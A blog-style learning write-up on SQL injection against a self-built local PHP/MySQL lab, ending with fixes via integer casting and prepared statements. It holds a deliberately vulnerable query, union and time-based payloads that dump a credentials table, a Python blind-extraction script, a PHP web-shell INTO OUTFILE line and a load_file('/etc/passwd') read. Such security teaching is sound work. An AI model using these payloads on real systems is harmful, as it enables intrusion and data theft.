---
title: SQL injection (Back to Basics)
tag: backtobasics 
image: /images/b2bsql/info.png
---

After a humiliating defeat in every area be it VAPT, CTFs or bug bounty, I came up with the idea to just go back to basics. For the first one I am going to learn about Mysql, all the different types of injections possible and finally patch them. First let's go over a basic lab I created to do this.
[Here's something handy](https://websitesetup.org/mysql-cheat-sheet/)
<!--more-->
<img src="/images/b2bsql/info.png" width="1000">

Lets create a new user and database for the lab. Open up mysql as root.

```
create database sqlinjection;
create user 'test'@'localhost' identified by 'test';
grant all privileges on sqlinjection.* to 'test'@'localhost';
flush privileges;
```

We created a new database and a new user. Then we granted permissions to the new user to be able to perform actions on the 'sqlinjection' database. Next create some basic tables.

```
create table creds(user varchar(100),password varchar(100));
create table fruits(id int(10),name varchar(50));

insert into creds values('admin','rootyboi');
insert into fruits values(1,'apple');
```

Now we have the database ready lets move on to the php to interact with it. Here is a simple index.php file running on a lighttpds server(Because that was the only server installed when I started).

```
<html>
<body>
<h1>Welcome to SQL injection testing grounds</h1>
<p>Try playing with the "id" parameter</p>
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$dbhost = "localhost";
$dbuser = "test";
$dbpass = "test";
$db = "sqlinjection";
$conn = new mysqli($dbhost, $dbuser, $dbpass,$db);
if(isset($_GET['id']))
{
$id=$_GET['id'];
$sql="SELECT * FROM fruits WHERE id='$id'";
$result=mysqli_query($conn,$sql);
$row = mysqli_fetch_all($result);
if($row)
{
echo "<font size='5' color= '#99FF00'>";
//echo "Fruit: ". $row['name'];
echo print_r($row);
}
else 
{
echo '<font color= "#FFFF00">';
print_r(mysqli_error());
echo "</font>";  
}
}
?>
</body>
</html>
```

I know it looks stupid, but if it works it ain't stupid. Moving on I will try to change the sql queries and try to exploit the injection for each change.

## Basic Injection

First lets see the normal output.

<img src="/images/b2bsql/normal.png" width="500">

While not very eye catchy, it works. On entering `id=1` we get the first fruit. Next lets try showing 2 fruits at once. 

<img src="/images/b2bsql/inject1.png" width="500">

On injecting `id=1 or id=2-- ;` we were able to show an extra unintended entry. Lets dump the whole table.

<img src="/images/b2bsql/inject2.png" width="500">

That was the basic SQL injection we all know and love. Onto more complex injections.

Lets try listing all the tables in this database.

## Enumerate the database

If we perform just a basic sql injection and report the issue it wouldn't be half as fun or maybe the client may even say that there is nothing sensitive inside the table and you are worthless and why are you even here (maybe I exaggerated a bit). But the real fun begins when we read data from other tables or maybe even escalate the sql injection to a full blown RCE.

First lets find the version of the database using the `@@version` query. Similarly You can use `select user(),database();` to find the database and user names.

<img src="/images/b2bsql/version.png" width="500">

Next let's list out all the other tables in the current database using the `information_schema` database. This database contains information such as all the tables, users, privileges, columns, plugins etc. So yeah, pretty juicy if you can reach it. Another juicy database would be the "mysql" database which consists of information about users, password hashes, logs which are obviously sensitive. 
 
<img src="/images/b2bsql/tables.png" width="500">

The last table 'creds' looks pretty good and now we can just enumerate it.

## Union Based Injection

If you can figure out how many columns the sql query is selecting then you can use union based injection. This is due to the fact that "union" only selects the same number of columns which are selected in the previous select statement. To figure out how many we try selecting `"null"`. Lets see how.

<img src="/images/b2bsql/null.png" width="500">

Try changing the amount of "null" s in the injection. If you don't see any error then you can just adjust all your future union queries appropriately. Here only on "null" should suffice since we know we are selecting only the names from fruits table.

Now if you primary query is selecting something like 3 columns from a table and you just want to select maybe two from another table you can fill the blank using "null" again. 

`select fruit,colour,taste from fruits where id=1 union select name,password,null from creds-- ;`

<img src="/images/b2bsql/user.png" width="500">

<img src="/images/b2bsql/pass.png" width="500">

## Blind Injection

Blind injection is when you either see a very limited or no output to your payloads. To detect them we either rely on the limited output which can be seen as a yes/no or by the delay in processing of the request.

Let's modify our php code a bit.

```
if($row)
{
//print_r($row);
echo 'fruit found';
}
else 
{
echo 'Entry not found';
echo '<font color= "#FFFF00">';
echo (mysqli_error($conn));
echo "</font>";  }}
```

Now we won't be able to see the records but we will know if there was any result returned.

<img src="/images/b2bsql/blindnormal.png" width="500">

Next we can use the "like" operator to see if there is a creds table present in the database. We will supply a non existent fruit id so that we can use union to see if any result is produced.

<img src="/images/b2bsql/blindinjection.png" width="500">

with the query `id=12 union select table_name from information_schema.tables where table_name like 'creds%'` we see it returned "fruit found". this time we already knew that there was a table named "creds" present. In other cases we can look for table names alphabet by alphabet.

For example:

`where table_name like 'a%'`

If this returns "fruit found" we will know there was a table with name starting with "a". The "a%" will match anything after 'a'. Next we can do:

`where table_name like 'ab%'`

If this returns "No entry found" we will know that there are no table like that. This type of injection really calls for a good script to brute-force for possible table names. Not only table name but you can also brute-force for the contents of the table.

`union select user from creds where user like 'roo%'`

Here is a really simple script I cooked up:

```
import requests

alphabets=[]

first = 'a'
for i in range(0, 26):
	alphabets.append(first)
	first = chr(ord(first) + 1)

entry=''
count=0
while(count<28):
	for x in alphabets:
		r=requests.get("http://localhost/?id=12 union select user from creds where user like '{}%'".format(entry+x))
		if 'fruit' in r.text:
			entry+=x
			print(entry)
			break
		else:
			pass
			count+=1
```

And here's a sample output:

```
$ python3 brute.py 
a
ad
adm
admi
admin
```

So we can then build upon this for our needs. Next up lets look at the time based injections.

We use time based injections when we don't get any output. This can be the case when we are making a POST/PUT request that dosn't necessarily will give a response text back. Maybe a request that is using "Insert" or "Update" on the db records. We use the "sleep()" operator here. The concept is that if a record is present in the database or the first part of query was successful we can notice the time it took to process our query. For example:

`id=12 and sleep(5)`

Here there will be no time delay because the first part of the query returns no result or can be considered 'false'. Hence the other part of "and" is not evaluated because we have already encountered a "false" so the the result will be "false" only regardless of the second part of the query. 

`id=1 and sleep(5)`

In this case a time delay will be noticed because the first part return true. We can use this method again to develop a script like above to extract contents of the db.

<img src="/images/b2bsql/time.png" width="500">

We can create a more complex query like

`id=12 union select user from creds where user like 'admin%' and sleep(5)`

Here you will notice the time delay because the query was successful. 

One thing to be noticed is that all the injection here made use of "union" operator. Lets try "Group by" and "order by".

"Order by" is used to sort the result in ascending or descending order depending on the column number that is supplied. So "Order by" is really helpful in finding the number of columns inside a table.

<img src="/images/b2bsql/order.png" width="500">

<img src="/images/b2bsql/order2.png" width="500">

When I didn't get any error that means we have found the number of columns.

## Misconfigured Permissions

If by chance there was even a small misconfiguration in the user permissions the malicious user may be able to delete/update/drop tables, read/write external files on the server, or just straight up shut everything down. 

I tried achieving RCE using sql injection but I found it very unrealistic with just the default configurations. Lets list them:

- Firstly, the current user should have all the privileges on all the databases. Normally developers would only allow the user to have access to the database in use. So unless the developers used the root account to run the db on web server. 

- Second, The DB I am using (Mysql 5.7.33) on giving a query like 

`select "<?php system($_GET['c']); ?>" into outfile "/var/www/html/shell.php";`

  Gives an error that the web server directory was not writable. And the dev would have to explicitly go and change the settings so that the web directory is writable.

Same thing  was found during reading random file, you can use:

`select load_file('/etc/passwd');`

Will return a NULL, if you have not configured mysql to read from a directory.

All this is not to say that it cannot be done. I have read blogs about these techniques working once on phpmyadmin. So every software will have different default configurations. 

Finally a simple `shutdown;` as expected shutdown the server. But a hacker can do a lot more interesting things than that, unless they just want hit the financial side of things. (monetary and reputational loss).

## Patching 

To fix these issues I found that just basic casting the input to the expected type fo input got rid of many issues. For example In our case there was an injection in the "id" parameter. Now if I just cast the input to integer type, the injection was gone.

Change:

`$id=$_GET['id];`

To

`$id=$_GET['id'];`
`$intid=(int)$id;`

Now using 'intid' will remove most of the injection because they contain characters other than integers. This is what I believe the next technique does automatically.  

Prepared Statements

This method is the most popular way to get rid of injections for a reason. Unless the developer creates some custom functions which may have weaknesses, there shouldn't any issue.

prepared statements look something like:

```
$sql="Select name from fruits where id=?";
$stmt=$conn->prepare($sql);
$stmt->bind_param("i",$id);
$stmt->execute();
$result=$stmt->get_result();
$row=$result->fetch_all();
```

The "i" in this line `$stmt->bind_param("i",$id);` is used to tell about the expected type of input (integer in our case).

After some testing with this, I was not able to perform any kind of injection. To conclude, there is not any reason I was able to see that the devs would not use prepared statements.

## Conclusion

Of course this is not exhaustive post by any means. I may update this as I learn new stuff. I have uploaded the material for this blog [here](https://github.com/vandanrohatgi/Material).